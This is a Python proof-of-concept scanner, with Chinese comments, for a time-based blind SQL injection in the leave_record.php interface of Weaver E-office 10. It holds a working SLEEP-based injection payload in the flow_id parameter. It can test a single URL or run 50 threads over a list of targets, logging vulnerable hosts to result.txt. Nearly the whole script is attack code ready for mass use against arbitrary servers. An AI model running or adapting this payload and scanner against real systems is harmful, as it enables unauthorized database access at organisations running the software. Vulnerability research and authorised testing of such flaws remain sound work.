#泛微E-office-10接口leave_record.php存在SQL注入漏洞
import argparse,requests,sys
from multiprocessing.dummy import Pool   #多线程库
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    pass
def poc(target):
    payload = '/eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%285%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10'
    #目标主机拒绝连接，程序后续会停止，添加try
    try:
        res1 = requests.get(url=target,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False)
            if res2.elapsed.total_seconds() - res1.elapsed.total_seconds() >=5 and res2.elapsed.total_seconds() >=5:
                print(f"[+]{target}存在延时sql注入")
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        print(f"[-]{target}请求错误")



def main():
    banner()

    #第一个处理用户输入的参数
    parse = argparse.ArgumentParser(description = "泛微E-office-10接口leave_record.php存在SQL注入漏洞")

    #添加命令行的参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")

    #实例化
    args = parse.parse_args()

    #对用户的输入做判断，url还是文件
    if args.url and not args.file:
        #开始测试
        poc(args.url)
    elif args.file and not args.url:
        #开始读取文件并逐个测试
        url_list = []
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip())
        #多线程
        print(f"[*] 已加载 {len(url_list)} 个URL进行测试")
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
        print("[*] 所有URL测试完成")
    else:
        print(f"usage:Python{sys.argv[0]}-h")

#设置程序的入口

if __name__ == "__main__":
    main()
